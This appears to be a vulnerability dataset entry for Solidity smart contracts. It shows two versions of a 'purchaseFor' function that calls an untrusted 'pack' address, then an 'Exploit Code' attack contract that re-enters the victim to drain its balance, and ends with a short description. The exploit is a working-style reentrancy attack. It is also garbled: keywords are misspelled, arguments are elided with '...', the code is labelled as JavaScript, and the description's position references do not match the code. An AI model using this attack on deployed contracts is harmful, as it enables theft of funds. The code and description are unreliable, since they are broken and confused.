## Vulnerable Code

```javascript
**Instance_1**
function purchaseFor(address pack, address[] memory users, uint16 packCount, address referrer) public payable {
        
        uint price = PackInterface(pack).calculatePrice(PackInterface(pack).basePrice(), packCount);
        
        for (uint i = 0; i < users.length; i++) {
            
            PackInterface(pack).purchaseFor.value(price)(users[i], packCount, referrer);    //Vulnerable position
        }
    }


**Instance_2**
function purchaseFor(address pack, address[] memory users, uint16 packCount, address referrer) public payable {
        for (uint i = 0; i < users.length; i++) {
            PackInterface(pack).purchaseFor(users[i], packCount, referrer);
        }
}//out1239
```



## Exploit Code

```javascript
contract PackInterface{

}
Contract Attack is PackInterface{
    uint count;
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }
    funciton purchaseFor(address user, uint16, address referrer) payable{
        count++;
        if(count < 5){
            victimAddress.call(byte4(keccak256(“purchaseFor(address , address[],  uint16, address)”)), ..., this, ..., ...);
        }
    }
    function() payable{

    }
}
```



##  Sophisticated Vulnerability Description
Note the location of comment of vulnerability position_2: IF the paramete of 'pack' is transformed from a malicious address, the method of "purchaseFor" can be a malicious function to reentrancy.Every single re-entry the comment of vulnerability position_1 will pick up the balance of Victim. ps:"...." represent an appropriate paramete.
